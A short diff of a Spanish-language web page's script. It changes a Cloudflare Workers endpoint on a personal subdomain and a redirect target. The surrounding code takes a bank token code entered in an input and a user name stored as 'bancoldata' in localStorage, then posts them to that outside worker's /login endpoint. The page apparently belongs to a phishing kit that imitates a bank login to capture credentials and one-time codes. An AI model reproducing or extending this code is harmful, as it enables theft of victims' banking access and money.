@@ -374,7 +374,7 @@
 
     <script>
         // ==================== CONFIGURACIÓN ====================
-        const WORKER_URL = 'https://quiet-haze-3548.micollflorez.workers.dev';
+        const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
 
         // ==================== ELEMENTOS ====================
         const input = document.getElementById('tokencode');
@@ -431,7 +431,7 @@
             loadingOverlay.style.display = 'flex';
 
             try {
-                // Obtener datos del localStorage
+                // Obtener datos del localStorage (igual que en el otro archivo)
                 let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
                 const usuario = bancoldata.usuario;
 
@@ -448,7 +448,7 @@
                 console.log('🆔 TransactionId:', transactionId);
                 console.log(`📡 Worker URL: ${WORKER_URL}`);
 
-                // Enviar al worker
+                // Enviar al worker con la misma estructura que el otro archivo
                 const response = await fetch(`${WORKER_URL}/login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -465,8 +465,8 @@
 
                 if (result.ok) {
                     // ✅ CÓDIGO VÁLIDO - REDIRIGIR A loading.html
-                    console.log('✅ Código válido, redirigiendo a validacion.html');
-                    window.location.href = 'validacion.html';
+                    console.log('✅ Código válido, redirigiendo a loading.html');
+                    window.location.href = 'loading.html';
                 } else {
                     // ❌ CÓDIGO INVÁLIDO
                     console.log('❌ Código inválido');
